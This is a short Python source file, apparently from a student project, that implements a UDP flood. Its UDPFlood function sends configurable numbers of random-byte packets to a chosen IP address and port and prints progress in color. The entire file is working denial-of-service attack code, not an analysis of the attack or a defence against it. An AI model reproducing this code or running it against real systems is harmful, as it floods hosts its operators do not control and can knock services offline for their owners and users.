#############################################################################################
# @Author: José Manuel Batista Galanducho
# @Número de Aluno: 13651
# UDPFlood, this class executes the UDP flood attack to a remote ip
#############################################################################################

import socket
import random

from termcolor import colored
from Helper_Classes.ArgumentMaker import progress_print


def UDPFlood(IP, port, pckt_size=1024, pckt_quantity=20):
    print(colored("---------- UDP Flood Started----------","green"))
    print(colored(f"UDP flood, target ->  {IP}:{port}","green"))
    sckt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pckt = random._urandom(pckt_size)

    try:
        fase = 1
        index = 0
        for i in range(pckt_quantity):
            if fase == 4:
                fase = 1
            index +=1
            percentage = round(100 * (index / pckt_quantity), 1)
            sckt.sendto(pckt, (IP, port))
            print(colored(f"\rSending {progress_print(fase)} | {percentage}%  -> On -> {IP}:{port} ", "green"),
                  end="")
            fase += 1
    except Exception as e:
        print(colored(f"Error during UDP flood: {e}","red"))
    finally:
        print("")
        sckt.close()
